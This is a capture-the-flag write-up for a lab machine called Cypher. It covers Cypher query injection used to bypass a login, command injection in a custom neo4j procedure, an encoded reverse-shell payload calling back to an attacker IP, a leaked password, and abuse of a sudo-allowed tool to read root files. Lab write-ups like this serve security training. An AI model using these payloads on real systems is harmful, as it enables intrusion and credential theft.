
# Cypher
- IP: 10.10.11.57

# Reconnaissance

## Nmap
```
sudo nmap -sS -sU -vv 10.10.11.57
Discovered open port 80/tcp on 10.10.11.57
Discovered open port 22/tcp on 10.10.11.57
```

## /etc/hosts
The following was added to the /etc/hosts file in order to be able to resolve it.
```
10.10.11.57 cypher.htb
```

## Browsing
When browsing `http://cypher.htb` the follwing page was displayed.

### Login page
There was a login page at `http://cypher.htb/login`

## Fuzzing
```
➜  cypher ffuf -recursion --recursion-depth=10 -u http://cypher.htb/FUZZ -w ~/repos/SecLists/Discovery/Web-Content/common.txt -o common.json
[omitted]
about                   [Status: 200, Size: 4984, Words: 1117, Lines: 179]
api                     [Status: 307, Size: 0, Words: 1, Lines: 1]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1]
index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163]
index.html              [Status: 200, Size: 4562, Words: 1285, Lines: 163]
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8]
[INFO] Adding a new job to the queue: http://cypher.htb/testing/FUZZ
[INFO] Scanning: http://cypher.htb/testing/FUZZ
```

## An interesting file & comment
An interesting file was found under ` http://cypher.htb/testing/` called `custom-apoc-extension-1.0-SNAPSHOT.jar` which could be downloaded.

as well as an interesting comment found in the source for `http://cypher.htb/login`:
```
 <script>
    // TODO: don't store user accounts in neo4j
    function doLogin(e) {
      e.preventDefault();
```

So I could tell I'm dealing with neo4j, and the idea was to further inspect the file.

```
➜  cypher unzip custom-apoc-extension-1.0-SNAPSHOT.jar -d extracted_dir
➜  cypher cd extracted_dir
➜  extracted_dir tree 
.
├── com
│   └── cypher
│       └── neo4j
│           └── apoc
│               ├── CustomFunctions$StringOutput.class
│               ├── CustomFunctions.class
│               ├── HelloWorldProcedure$HelloWorldOutput.class
│               └── HelloWorldProcedure.class
└── META-INF
    ├── MANIFEST.MF
    └── maven
        └── com.cypher.neo4j
            └── custom-apoc-extension
                ├── pom.properties
                └── pom.xml

9 directories, 7 files
```

Okay, so there are some custom classes, a manifest, an xml and a .properties file. 

# Authentication bypass
From the link https://neo4j.com/docs/getting-started/cypher/ I gathered that Cypher is a query language. So, I tried something funky at the login page:

 That confirmed that it was vulnerable, so I decided to try other queries.
 
 With the query: 'select * from users I got an interesting error
 ```
Neo.ClientError.Statement.SyntaxError} {message: Invalid input 'select': expected an expression, 'FOREACH', 'ORDER BY', 'CALL', 'CREATE', 'LOAD CSV', 'DELETE', 'DETACH', 'FINISH', 'INSERT', 'LIMIT', 'MATCH', 'MERGE', 'NODETACH', 'OFFSET', 'OPTIONAL', 'REMOVE', 'RETURN', 'SET', 'SKIP', 'UNION', 'UNWIND', 'USE', 'WITH' or (line 1, column 55 (offset: 54)) "MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = ''select * from users' return h.value as hash" ^}
 ```
 
 and I could tell I could control the value that ends up in the query `"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '[controllable-value]' return h.value as hash"`

I opened burp and sent the request to the repeater and started to play around. 
After a while of testing I noticed that I could drop the rest of the command by adding a comment `//`. This I verified by first sending
```
*' return h.value as hash
```

which yielded the response

but then when I added `//` to the same command, i.e when I sent
```
*' return h.value as hash//
```

I got

Since I knew I could drop the rest of the query, it also meant that I could essentially modify it in whatever way I saw fit starting from closing the first single quote.

I immediately attempted to create a user

which showed I did not have write permissions.

Anecdote:
I sent more test queries, and with one of them, I ended up in my *first* rabbit hole. (See section **Things That Didn't Work** for details)

When sending `' OR 1=1 CALL db.labels() YIELD label RETURN label//` I got a malformed response
```

Traceback (most recent call last):
  File "/app/app.py", line 144, in verify_creds
    db_hash = results[0]["hash"]
KeyError: 'hash'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/app.py", line 165, in login
    creds_valid = verify_creds(username, password)
  File "/app/app.py", line 151, in verify_creds
    raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}")
ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' OR 1=1 CALL db.labels() YIELD label RETURN label//' return h.value as hash: Traceback (most recent call last):
  File "/app/app.py", line 144, in verify_creds
    db_hash = results[0]["hash"]
KeyError: 'hash'
```

Which meant I could control what ends up in `db_hash`, and which seemed to be used somehow to verify the credentials. Here I got an idea. Since I didn't have write permissions, but I could control what hash ends up for the authorization, it meant I could potentially create my own *known* hash. 

First, I created a SHA1 hash with an arbitrary string, in this case 'ilovemango'.
```
➜  cypher echo -n "ilovemango" | openssl sha1
SHA1(stdin)= f6689cf79b90288dd5e622280d56fbe066716de1
```

Then I deviced a payload that looked like
```
' or 1=1 return 'f6689cf79b90288dd5e622280d56fbe066716de1' as hash//
```

and set the password to `ilovemango`. After sending the request, I got:

Amazing. An authentication bypass.

# RCE Via Demo

From the requests sent by the search function in `http://cypher.htb/demo`, I could see that they were sent via `http://cypher.htb/api/cypher?query=<insert-query-here>`, so naturally I went for an LFI attempt directly.

Even though I didn't get to expose the file, it did tell me what methods that were available.

From `SHOW PROCEDURES` I found familiar entries:
```
[
  {
    "name": "custom.getUrlStatusCode",
    "description": "Returns the HTTP status code for the given URL as a string",
    "mode": "READ",
    "worksOnSystem": false
  },
  {
    "name": "custom.helloWorld",
    "description": "A simple hello world procedure",
    "mode": "READ",
    "worksOnSystem": false
  },
```

These seemed promising considering they were custom and that I actually had a snapshot of their source code. I decided to test them out.

### custom.getUrlStatusCode

### custom.helloWorld

Great, but even better would be to understand how they work. So I researched how to decompile java code, and arrived at installing `JD-GUI` to analyze them.

## JD-GUI Analysis

### HelloWorldProcedure.class

There didn't seem to be that much to play with for this procedure, so I checked the next one.

### CustomFunctions.class

Here I could see that it was (as expected) the source code for the procedure `getUrlStatusCode`.
This thing was obviously vulnerable to a command injection, as it didn't properly sanitize the input. To break it down:
1. It checks if the input starts with `http://` and if it doesn't it prepends it with `http://`
2. It creates a command `"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url`
3. it calls `Runtime.getRuntime().exec(command)`

So in order to exploit this, all I had to do was append `;[command]` at the end of the url to chain in my own command:

RCE achieved. ✅ 

# User Flag

I attempted to directly get the flag via injecting `cat /home/neo4j/user.txt`, but that wasn't successful.

## Reverse shell
I deviced a payload

```
call custom.getUrlStatusCode("http://cypher.htb/;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTAvNDQ0MSAwPiYxCg== | base64 -d | /bin/bash -i")
```

which gave me a shell:
```
$ id
uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)
```

I found a home directory belonging to a user `graphasm`. 
```
$ pwd
/home/graphasm
$ ls
bbot_preset.yml
user.txt
$ cat user.txt
cat: user.txt: Permission denied
```

And the file `bbot_preset.yml`  contained a password:
```
$ cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: [omitted]
      password: [omitted]

```

I checked it out with `hashcat` but it didn't seem to be a hash. So the natural thing to try here was to directly attempt to ssh into graphasm with the password:
```
➜  cypher ssh graphasm@10.10.11.57
graphasm@10.10.11.57's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Mar  3 03:41:41 AM UTC 2025

  System load:  0.0               Processes:             251
  Usage of /:   74.8% of 8.50GB   Users logged in:       1
  Memory usage: 39%               IPv4 address for eth0: 10.10.11.57
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Mar 3 03:41:41 2025 from 10.10.16.10
graphasm@cypher:~$ cat user.txt 
[omitted]
```

User flag owned. ✅

Note: 
Somewhere along the way of poking around with this user I got caught in my *second* and *third* rabbit holes.

# Root Flag

To start with the standard privilege escalation, the first thing I usually do is to evaluate the user permissions and/or `rwx` permissions for the user and the groups. 

```
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot

graphasm@cypher:~$ id
uid=1000(graphasm) gid=1000(graphasm) groups=1000(graphasm)
```

The user had sudo access to `/usr/local/bin/bbot`, so that became my attack vector.

```
graphasm@cypher:/usr/local/bin$ cat bbot
#!/opt/pipx/venvs/bbot/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bbot.cli import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```
Here I could see that it imports `from bbot.cli import main`. This was kept in mind.

```
graphasm@cypher:/usr/local/bin$ ./bbot --help
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

usage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]] [--strict-scope] [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo] [-em MODULE [MODULE ...]]
            [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]] [--allow-deadly] [-n SCAN_NAME] [-v] [-d] [-s] [--force] [-y] [--dry-run] [--current-preset] [--current-preset-full] [-o DIR] [-om MODULE [MODULE ...]]
            [--json] [--brief] [--event-types EVENT_TYPES [EVENT_TYPES ...]] [--no-deps | --force-deps | --retry-deps | --ignore-failed-deps | --install-all-deps] [--version] [-H CUSTOM_HEADERS [CUSTOM_HEADERS ...]]
            [--custom-yara-rules CUSTOM_YARA_RULES]

Bighuge BLS OSINT Tool

options:
  -h, --help            show this help message and exit

Target:
  -t TARGET [TARGET ...], --targets TARGET [TARGET ...]
                        Targets to seed the scan
  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]
                        What's considered in-scope (by default it's the same as --targets)
  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]
                        Don't touch these things
  --strict-scope        Don't consider subdomains of target/whitelist to be in-scope

Presets:
  -p [PRESET ...], --preset [PRESET ...]
                        Enable BBOT preset(s)
  -c [CONFIG ...], --config [CONFIG ...]
                        Custom config options in key=value format: e.g. 'modules.shodan.api_key=1234'
  -lp, --list-presets   List available presets.

Modules:
  -m MODULE [MODULE ...], --modules MODULE [MODULE ...]
                        Modules to enable. Choices: bucket_azure,iis_shortnames,trufflehog,myssl,skymem,dotnetnuke,dockerhub,bypass403,wappalyzer,pgp,hackertarget,git_clone,trickest,dnscaa,wayback,credshed,paramminer_headers,oauth,ajaxpro,secretsdb,chaos,dnsbrute,github_workflows,docker_pull,urlscan,bucket_amazon,gowitness,code_repository,hunt,postman,telerik,nuclei,azure_tenant,dnsdumpster,zoomeye,newsletters,internetdb,ffuf_shortnames,bucket_google,dnsbrute_mutations,robots,wafw00f,bucket_file_enum,leakix,baddns_direct,crt,dnscommonsrv,fingerprintx,paramminer_getparams,portscan,emailformat,subdomaincenter,postman_download,dastardly,git,wpscan,badsecrets,securitytxt,bucket_firebase,hunterio,bevigil,anubisdb,securitytrails,rapiddns,azure_realm,columbus,baddns,asn,ipneighbor,c99,certspotter,affiliates,ipstack,ip2location,vhost,social,gitlab,bucket_digitalocean,baddns_zone,censys,paramminer_cookies,unstructured,github_org,sitedossier,dehashed,shodan_dns,github_codesearch,filedownload,fullhunt,passivetotal,builtwith,ntlm,httpx,viewdns,sslcert,digitorus,url_manipulation,host_header,generic_ssrf,ffuf,smuggler,virustotal,otx,binaryedge
  -l, --list-modules    List available modules.
  -lmo, --list-module-options
                        Show all module config options
  -em MODULE [MODULE ...], --exclude-modules MODULE [MODULE ...]
                        Exclude these modules.
  -f FLAG [FLAG ...], --flags FLAG [FLAG ...]
                        Enable modules by flag. Choices: subdomain-hijack,report,affiliates,iis-shortnames,cloud-enum,web-paramminer,web-basic,subdomain-enum,email-enum,social-enum,active,baddns,safe,portscan,deadly,web-thorough,passive,service-enum,slow,web-screenshots,code-enum,aggressive
  -lf, --list-flags     List available flags.
  -rf FLAG [FLAG ...], --require-flags FLAG [FLAG ...]
                        Only enable modules with these flags (e.g. -rf passive)
  -ef FLAG [FLAG ...], --exclude-flags FLAG [FLAG ...]
                        Disable modules with these flags. (e.g. -ef aggressive)
  --allow-deadly        Enable the use of highly aggressive modules

Scan:
  -n SCAN_NAME, --name SCAN_NAME
                        Name of scan (default: random)
  -v, --verbose         Be more verbose
  -d, --debug           Enable debugging
  -s, --silent          Be quiet
  --force               Run scan even in the case of condition violations or failed module setups
  -y, --yes             Skip scan confirmation prompt
  --dry-run             Abort before executing scan
  --current-preset      Show the current preset in YAML format
  --current-preset-full
                        Show the current preset in its full form, including defaults

Output:
  -o DIR, --output-dir DIR
                        Directory to output scan results
  -om MODULE [MODULE ...], --output-modules MODULE [MODULE ...]
                        Output module(s). Choices: teams,stdout,json,discord,web_report,python,emails,subdomains,csv,http,slack,neo4j,txt,splunk,asset_inventory,websocket
  --json, -j            Output scan data in JSON format
  --brief, -br          Output only the data itself
  --event-types EVENT_TYPES [EVENT_TYPES ...]
                        Choose which event types to display

Module dependencies:
  Control how modules install their dependencies

  --no-deps             Don't install module dependencies
  --force-deps          Force install all module dependencies
  --retry-deps          Try again to install failed module dependencies
  --ignore-failed-deps  Run modules even if they have failed dependencies
  --install-all-deps    Install dependencies for all modules

Misc:
  --version             show BBOT version and exit
  -H CUSTOM_HEADERS [CUSTOM_HEADERS ...], --custom-headers CUSTOM_HEADERS [CUSTOM_HEADERS ...]
                        List of custom headers as key value pairs (header=value).
  --custom-yara-rules CUSTOM_YARA_RULES, -cy CUSTOM_YARA_RULES
                        Add custom yara rules to excavate

EXAMPLES

    Subdomains:
        bbot -t evilcorp.com -p subdomain-enum

    Subdomains (passive only):
        bbot -t evilcorp.com -p subdomain-enum -rf passive

    Subdomains + port scan + web screenshots:
        bbot -t evilcorp.com -p subdomain-enum -m portscan gowitness -n my_scan -o .

    Subdomains + basic web scan:
        bbot -t evilcorp.com -p subdomain-enum web-basic

    Web spider:
        bbot -t www.evilcorp.com -p spider -c web.spider_distance=2 web.spider_depth=2

    Everything everywhere all at once:
        bbot -t evilcorp.com -p kitchen-sink

    List modules:
        bbot -l

    List presets:
        bbot -lp

    List flags:
        bbot -lf
```

So `BIGHUGE BLS OSINT TOOL v2.1.0.4939rc` was the program and I could see some interesting options, most notably `--dry-run`. When looking at the code for `cli.py`, it was confirmed that it skipped the scan step:
```python
	if not options.dry_run:
				...
    except BBOTError as e:
        log.error(str(e))
        log.trace(traceback.format_exc())

		...
```

This proved useful when testing different commands. Another two flags that proved useful were `-v` for verbose and `-d` for debugging.

After testing for a while and coming up empty, I checked again for the arguments and saw these four:
```
Target:
  -t TARGET [TARGET ...], --targets TARGET [TARGET ...]
                        Targets to seed the scan
  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]
                        What's considered in-scope (by default it's the same as --targets)
  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]
                        Don't touch these things
  --strict-scope        Don't consider subdomains of target/whitelist to be in-scope
```

And when passing `-t` I got:
```
graphasm@cypher:/usr/local/bin$ sudo bbot -v --dry-run -d -t /root/root.txt
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[INFO] Reading targets from file: /root/root.txt
[omitted]
[DBUG] Generated Regex [(([a-z0-9-]+\.)[omitted]] for domain [contents of /root/root.txt]
[omitted]
raphasm@cypher:/usr/local/bin$ 
```

All flags obtained. ✅ Mission successfully completed. ✅

# Things That Didn't work

## Rabbit Hole 1
I could see from an exception what paths were used for the python code.

After some googling, I arrived at `neo4j-python-driver`. I cloned the repository from git@github.com:neo4j/neo4j-python-driver.git and started looking through it.

In the end this didn't prove fruitful so I abandoned that endeavor. I also started looking at the below files:

#### MANIFEST.MF
```
➜  extracted_dir cat META-INF/MANIFEST.MF 
Manifest-Version: 1.0
Created-By: Maven JAR Plugin 3.4.1
Build-Jdk-Spec: 22
```

#### pom.properties
```
➜  extracted_dir cat META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.properties 
artifactId=custom-apoc-extension
groupId=com.cypher.neo4j
version=1.0-SNAPSHOT
```

#### pom.xml
```
➜  extracted_dir cat META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.xml       
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.cypher.neo4j</groupId>
    <artifactId>custom-apoc-extension</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <neo4j.version>5.23.0</neo4j.version>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.neo4j</groupId>
            <artifactId>neo4j</artifactId>
            <version>${neo4j.version}</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>3.8.1</version>
                <configuration>
                    <source>11</source>
                    <target>11</target>
                </configuration>
            </plugin>
            <plugin>
                <artifactId>maven-shade-plugin</artifactId>
                <version>3.2.4</version>
                <executions>
                    <execution>
                        <phase>package</phase>
                        <goals>
                            <goal>shade</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project>%                                                                
```

From here I saw some things:
* The versions of
	*  neo4j
	*  maven-complier-plugin
	*   maven-shade-plugin

But these too did not give me much of value.

## Rabbit Hole 2

I wanted to find files belonging to the group `neo4j`, which was at first clouded by plenty of output for files in `/proc/`, but after silencing them, I ended up with:
```
$ find / -path /proc -prune -o -group neo4j -ls 2>/dev/null
   397607      0 -rw-r--r--   1 neo4j    neo4j           0 Feb 24 13:04 /var/log/neo4j/security.log
   397592      0 -rw-r--r--   1 neo4j    neo4j           0 Feb 24 13:04 /var/log/neo4j/http.log
   393262      4 -rw-r--r--   1 neo4j    neo4j        1783 Mar  1 18:39 /var/log/neo4j/neo4j.log
   397606      0 -rw-r--r--   1 neo4j    neo4j           0 Feb 24 13:04 /var/log/neo4j/query.log
   393345    192 -rw-r--r--   1 neo4j    neo4j      194188 Mar  1 18:39 /var/log/neo4j/debug.log
   393243      4 -rw-r--r--   1 neo4j    neo4j           4 Mar  1 18:38 /var/lib/neo4j/run/neo4j.pid
   393249      0 -rw-r--r--   1 neo4j    neo4j           0 Mar  1 18:39 /var/lib/neo4j/data/databases/neo4j/id-buffer.tmp.0
   393248      4 drwxr-xr-x   2 neo4j    neo4j        4096 Mar  1 18:39 /var/lib/neo4j/data/databases/neo4j/schema/index/fulltext-1.0/7/7.tx
   393247      0 -rw-r--r--   1 neo4j    neo4j           0 Mar  1 18:39 /var/lib/neo4j/data/databases/system/id-buffer.tmp.0
   399026      4 -rw-r--r--   1 neo4j    neo4j          63 Oct  8 18:07 /var/lib/neo4j/.bash_history
     4075      0 -rw-r--r--   1 neo4j    neo4j           0 Mar  1 18:38 /sys/fs/cgroup/system.slice/neo4j.service/memory.pressure
        2      0 -rw-r--r--   1 neo4j    neo4j           0 Mar  1 19:28 /dev/shm/shell_tcp.py
   132483      4 drwxr-xr-x   2 neo4j    neo4j        4096 Mar  1 18:38 /tmp/hsperfdata_neo4j
   132490     32 -rw-------   1 neo4j    neo4j       32768 Mar  2 14:35 /tmp/hsperfdata_neo4j/1820
   132484     32 -rw-------   1 neo4j    neo4j       32768 Mar  2 14:35 /tmp/hsperfdata_neo4j/1410
   132486      4 drwx------   2 neo4j    neo4j        4096 Mar  1 18:39 /tmp/jetty-172_18_0_1-7474-neo4j-browser-5_24_0_jar-_browser-any-18406815084240426945
     1295      0 -rw-r--r--   1 neo4j    neo4j           0 Mar  1 19:31 /tmp/mane

```
So the user had `rwx` permissions for the following directories:
* /var/lib/neo4j/data/databases/neo4j/schema/index/fulltext-1.0/7/7.tx
* /tmp/hsperfdata_neo4j

I also saw that `.bash_history` seemed populated with data
```
$ cat ~/.bash_history
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```
(here was the password again)

and that there were some cli commands I could run

```
$ neo4j
Usage: neo4j [-hV] [--expand-commands] [--verbose] [COMMAND]
A partial alias for 'neo4j-admin server'. Commands for working with DBMS process from 'neo4j-admin server' category can
be invoked using this command.
      --expand-commands   Allow command expansion in config value evaluation.
  -h, --help              Show this help message and exit.
  -V, --version           Print version information and exit.
      --verbose           Prints additional information.
Commands:
  version  Print version information and exit.
  help     Display help information about the specified command.
  console  Start server in console.
  restart  Restart the server daemon.
  start    Start server as a daemon.
  status   Get the status of the neo4j server process.
  stop     Stop the server daemon.

Environment variables:
  NEO4J_CONF    Path to directory which contains neo4j.conf.
  NEO4J_DEBUG   Set to anything to enable debug output.
  NEO4J_HOME    Neo4j home directory.
  HEAP_SIZE     Set JVM maximum heap size during command execution. Takes a number and a unit, for example 512m.
  JAVA_OPTS     Used to pass custom setting to Java Virtual Machine executing the command. Refer to JVM documentation
about the exact format. This variable is incompatible with HEAP_SIZE and takes precedence over HEAP_SIZE.
```

This seemed unnecessary since it was mostly in relation to the dbms and thus the idea was abandoned.

## Rabbit Hole 3

From 
```
$ ps aux | grep -i graphasm
graphasm    2156  0.0  0.2  20164 11264 ?        Ss   Mar01   0:00 /usr/lib/systemd/systemd --user
graphasm    2158  0.0  0.0  21148  3520 ?        S    Mar01   0:00 (sd-pam)
root        4031  0.0  0.1  14992  7876 ?        Ss   Mar01   0:00 sshd: graphasm [priv]
graphasm    4087  0.0  0.1  14992  6848 ?        S    Mar01   0:00 sshd: graphasm@pts/0
graphasm    4088  0.0  0.1   9496  6272 pts/0    Ss+  Mar01   0:00 -bash
root        6240  0.0  0.1   9780  4924 pts/1    S    12:12   0:00 su graphasm
graphasm    6241  0.0  0.1   9324  6272 pts/1    S    12:12   0:00 bash
graphasm    6252  0.0  0.3  24780 13056 pts/1    Sl+  12:14   0:00 vim /usr/local/bin/bbot
root        6266  0.0  0.1   9780  5048 pts/2    S    12:15   0:00 su graphasm
graphasm    6267  0.0  0.1   9324  6144 pts/2    S+   12:15   0:00 bash
neo4j       8476  0.0  0.0   6544  2304 ?        S    15:29   0:00 grep -i graphasm
```

I could see the file /usr/local/bin/bbot was in an active `vim` session, as well as root running a `su` session with `graphasm`. For the vim session the file contained:
```
$ cat /usr/local/bin/bbot
#!/opt/pipx/venvs/bbot/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bbot.cli import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```
(This was later proved useful for getting the root flag)

Additionally I saw that I could tap into the pts.
```
$ ps -o tty= -p <pid-here>
pts/<some-number>
$ echo "test" > /dev/pts/2
$ echo "touch /home/graphasm/test.txt" > /dev/pts/2
```

Again this did not work as intended, and when tested on my local system I could see that text ended up in vim or that text ended up in the active terminal, but I couldn't get them to execute. For the vim session the trick would be to escape the insert and do something like `:<command>`, but I couldn't get it to work. However, perhaps with the right payload it would be possible to execute commands or even pop a shell.
